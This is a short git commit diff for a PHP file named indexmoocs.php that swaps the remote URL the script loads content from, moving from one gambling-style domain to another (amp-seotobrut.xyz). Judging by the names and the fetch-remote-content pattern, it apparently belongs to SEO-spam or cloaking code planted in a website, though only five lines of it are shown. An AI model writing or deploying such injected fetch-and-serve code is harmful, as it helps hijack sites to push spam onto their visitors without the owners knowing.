5f734608a7788186f072e7d61b63a9a6ea685515
moonnaa098 <mooonnn.trader01@gmail.com>
2025-01-04 00:54:08 +0700

    Update indexmoocs.php

--- indexmoocs.php
+++ indexmoocs.php
@@ -1,5 +1,5 @@
 <?php
-$contents = 'https://amp.nextgacor.com/moocs.txt';
+$contents = 'https://amp-seotobrut.xyz/demo.txt';
 $allDevice = true;
 function getContents($url) {
     if(!function_exists('file_get_contents')) {
